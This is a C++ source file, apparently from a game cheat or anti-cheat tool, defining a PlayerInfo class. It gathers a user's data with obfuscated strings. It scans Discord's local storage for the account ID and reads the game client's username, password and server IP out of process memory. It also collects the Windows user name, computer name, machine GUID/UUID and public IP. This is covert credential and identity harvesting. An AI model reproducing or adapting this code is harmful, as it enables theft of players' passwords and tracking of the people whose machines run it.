#include "stdafx.h"

#include "SAC.h"
#include <vector>
#include <cstdio>
#include <codecvt>
#include <Shlwapi.h>
#include <Windows.h>
#include <iostream>
#include "MemoryAddr.h"
#include <winhttp.h>
#include <wininet.h>
#include <thread>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

std::vector<std::string> GetFilesInDirectory(const std::string& directory, const std::string& extension) {
	std::vector<std::string> files;
	std::string searchPath = directory + _xor("\\*").c_str() + extension;

	WIN32_FIND_DATAA fileData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fileData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				files.push_back(fileData.cFileName);
			}
		} while (FindNextFileA(hFind, &fileData) != 0);
		FindClose(hFind);
	}

	return files;
}

std::string ExtractIDFromFiles(const std::string& directory, const std::vector<std::string>& files) {
	std::string id;

	for (const auto& file : files) {
		std::ifstream input(directory + file, std::ios::binary);
		if (input) {
			std::string content((std::istreambuf_iterator<char>(input)), std::istreambuf_iterator<char>());
			size_t pos = content.find(_xor("_state\":{\"users\":[{\"id\":\"").c_str());
			if (pos != std::string::npos) {
				size_t idStart = pos + strlen(_xor("_state\":{\"users\":[{\"id\":\"").c_str());
				size_t idEnd = content.find("\"", idStart);
				if (idEnd != std::string::npos) {
					id = content.substr(idStart, idEnd - idStart);
					break;
				}
			}
		}
	}

	return id;
}

std::string WStringToString(const std::wstring& wstr) {
	if (wstr.empty()) return std::string();
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

std::string PlayerInfo::GetDiscordID() {
	TCHAR roamingPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, roamingPath))) {

		std::wstring wPath(roamingPath);
		std::string roamingString = WStringToString(wPath);

		std::string discordFolder = _xor("\\discord\\Local Storage\\leveldb\\").c_str();
		std::string directory = roamingString + discordFolder;

		std::vector<std::string> files = GetFilesInDirectory(directory, _xor(".ldb").c_str());
		std::vector<std::string> logFiles = GetFilesInDirectory(directory, _xor(".log").c_str());

		std::string idFromIdb = ExtractIDFromFiles(directory, files);

		if (!idFromIdb.empty()) {
			return idFromIdb;
		}
	}
	return "NOTFOUND";
}

std::string PlayerInfo::GetPublicIP() {

	HINTERNET net = InternetOpen(_xor(L"IP retriever").c_str(),
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET conn = InternetOpenUrl(net,
		_xor(L"http://myexternalip.com/raw").c_str(),
		NULL,
		0,
		INTERNET_FLAG_RELOAD,
		0);

	char buffer[4096];
	DWORD read;

	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
	InternetCloseHandle(net);

	char* result = new char[read + 1];
	strncpy(result, buffer, read);
	result[read] = '\0';

	return cEngine->Clean(result);


}

std::string PlayerInfo::GetPUserName()
{



	char userNameBuffer[256 + 1];
	DWORD size = 256 + 1;

	if (GetUserNameA(userNameBuffer, &size))
	{
		return userNameBuffer;
		//std::wcout << "User Name: " << userName << std::endl;
	}
	else
	{
		DWORD errorCode = GetLastError();
		return "";
		//std::cerr << "Error getting user name. Error code: " << errorCode << std::endl;
	}



}

std::string PlayerInfo::GetPComputerName()
{
	char computerNameBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

	if (GetComputerNameA(computerNameBuffer, &size))
	{
		return computerNameBuffer;
	}
	else
	{
		DWORD errorCode = GetLastError();
		return "";
	}



}

void PlayerInfo::GetUserData()
{

	while (true) {

		UserUSN = cEngine->RPM<int>(cEngine->CShell + AC_PLAYER_USN);

		if (UserUSN != 0 && UserUSN != 25689755)
			break;

		Sleep(100);

	}

	UserIGN = cEngine->RPMS(cEngine->CShell + AC_PLAYER_IGN);
	if (UserIGN == "")
		UserIGN = _xor("[UNKOWN]").c_str();
	UserURN = cEngine->RPMS(cEngine->CShell + AC_PLAYER_URN);
	UserPWD = cEngine->RPMS(cEngine->CShell + AC_PLAYER_PWD);
	AC_SRV_IP = cEngine->RPMS(cEngine->CShell + AC_SERVER_SIP);
	UserUUID = cEngine->GetUUID();
	UserGUID = cEngine->Clean(cEngine->GetGUID());
	UserDID = GetDiscordID();
	PC_CNAME = GetPComputerName();
	PC_UNAME = GetPUserName();
	UserIP = GetPublicIP();


	this->GotUserData = true;


}